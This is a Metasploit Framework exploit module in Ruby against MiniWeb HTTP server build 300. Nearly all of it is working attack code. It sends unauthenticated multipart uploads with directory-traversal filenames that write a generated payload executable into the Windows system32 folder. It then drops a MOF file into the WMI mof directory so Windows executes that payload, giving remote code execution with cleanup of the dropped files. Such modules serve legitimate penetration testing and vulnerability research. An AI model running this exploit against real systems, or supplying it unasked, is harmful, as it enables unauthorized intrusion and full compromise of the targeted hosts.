##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  HttpFingerprint = { :pattern => [ /MiniWeb/ ] }

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::WbemExec
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'           => "MiniWeb (Build 300) Arbitrary File Upload",
      'Description'    => %q{
        This module exploits a vulnerability in MiniWeb HTTP server (build 300).
        The software contains a file upload vulnerability that allows an
        unauthenticated remote attacker to write arbitrary files to the file system.

        Code execution can be achieved by first uploading the payload to the remote
        machine as an exe file, and then upload another mof file, which enables
        WMI (Management Instrumentation service) to execute the uploaded payload.
        Please note that this module currently only works for Windows before Vista.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'AkaStep', # Initial discovery
          'Brendan Coles <bcoles[at]gmail.com>', # Metasploit
        ],
      'References'     =>
        [
          ['OSVDB', '92198'],
          ['OSVDB', '92200'],
          ['URL',   'http://dl.packetstormsecurity.net/1304-exploits/miniweb-shelltraversal.txt']
        ],
      'Payload'        =>
        {
          'BadChars' => "\x00",
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          # Tested on MiniWeb build 300, built on Feb 28 2013
          # - Windows XP SP3 (EN)
          ['MiniWeb build 300 on Windows (Before Vista)', {}]
        ],
      'Privileged'     => true,
      'DisclosureDate' => "Apr 9 2013",
      'DefaultTarget'  => 0))

    register_options([
      Opt::RPORT(8000),
      OptInt.new('DEPTH', [true, 'Traversal depth', 10])
    ], self.class)

  end

  def peer
    "#{rhost}:#{rport}"
  end

  def check

    begin
      uri = normalize_uri(target_uri.path.to_s, "#{rand_text_alpha(rand(10)+5)}")
      res = send_request_cgi({
        'method'  => 'GET',
        'uri'     => uri
      })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE
      fail_with(Exploit::Failure::Unreachable, "#{peer} - Connection failed")
    end

    if !res or res.headers['Server'].empty?
      return Exploit::CheckCode::Unknown
    elsif res.headers['Server'] =~ /^MiniWeb$/
      return Exploit::CheckCode::Detected
    end

    return Exploit::CheckCode::Unknown

  end

  def upload(filename, filedata)

    print_status("#{peer} - Trying to upload '#{::File.basename(filename)}'")
    uri   = normalize_uri(target_uri.path.to_s, "#{rand_text_alpha(rand(10)+5)}")
    depth = "../" * (datastore['DEPTH'] + rand(10))

    boundary   = "----WebKitFormBoundary#{rand_text_alphanumeric(10)}"
    post_data  = "--#{boundary}\r\n"
    post_data << "Content-Disposition: form-data; name=\"file\"; filename=\"#{depth}#{filename}\"\r\n"
    post_data << "Content-Type: application/octet-stream\r\n"
    post_data << "\r\n#{filedata}\r\n"
    post_data << "--#{boundary}\r\n"

    begin
      res = send_request_cgi({
        'method'  => 'POST',
        'uri'     => uri,
        'ctype'   => "multipart/form-data; boundary=#{boundary}",
        'data'    => post_data
      })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE
      fail_with(Exploit::Failure::Unreachable, "#{peer} - Connection failed")
    end

    return res

  end

  def exploit
    fname = "#{rand_text_alpha(rand(10)+5)}"

    # upload exe
    exe_name = "WINDOWS/system32/#{fname}.exe"
    exe = generate_payload_exe
    print_status("#{peer} - Sending executable (#{exe.length.to_s} bytes)")
    upload(exe_name, exe)

    # upload mof
    mof_name = "WINDOWS/system32/wbem/mof/#{fname}.mof"
    mof = generate_mof(::File.basename(mof_name), ::File.basename(exe_name))
    print_status("#{peer} - Sending MOF (#{mof.length.to_s} bytes)")
    upload(mof_name, mof)

    # list files to clean up
    register_file_for_cleanup("#{::File.basename(exe_name)}")
    register_file_for_cleanup("wbem\\mof\\good\\#{::File.basename(mof_name)}")
  end

end
